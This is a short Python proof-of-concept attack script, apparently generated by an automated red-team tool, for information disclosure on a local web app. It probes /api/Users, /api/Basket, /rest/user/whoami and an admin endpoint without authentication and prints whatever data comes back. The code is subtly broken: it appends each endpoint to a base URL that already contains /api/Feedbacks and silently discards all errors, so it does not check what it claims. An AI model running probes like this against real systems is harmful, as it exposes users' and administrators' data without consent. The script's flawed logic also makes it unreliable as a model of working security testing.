#!/usr/bin/env python3
"""
PoC: Information Disclosure - http://localhost:3000/api/Feedbacks
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
The HTTP response contains a list of comments with user IDs, indicating that sensitive information was disclosed.
"""

import requests

TARGET = "http://localhost:3000/api/Feedbacks"

ENDPOINTS = [
    "/api/Users",
    "/api/Feedbacks", 
    "/rest/user/whoami",
    "/api/Basket",
    "/rest/admin/Challenges",
]

def main():
    print("[*] Testing Information Disclosure on " + TARGET)
    
    for endpoint in ENDPOINTS:
        url = TARGET.rstrip('/') + endpoint
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and len(response.text) > 0:
                print("[+] FOUND: " + endpoint + " (status: " + str(response.status_code) + ")")
                print("[*] Content: " + response.text[:200])
        except Exception as e:
            pass

if __name__ == "__main__":
    main()
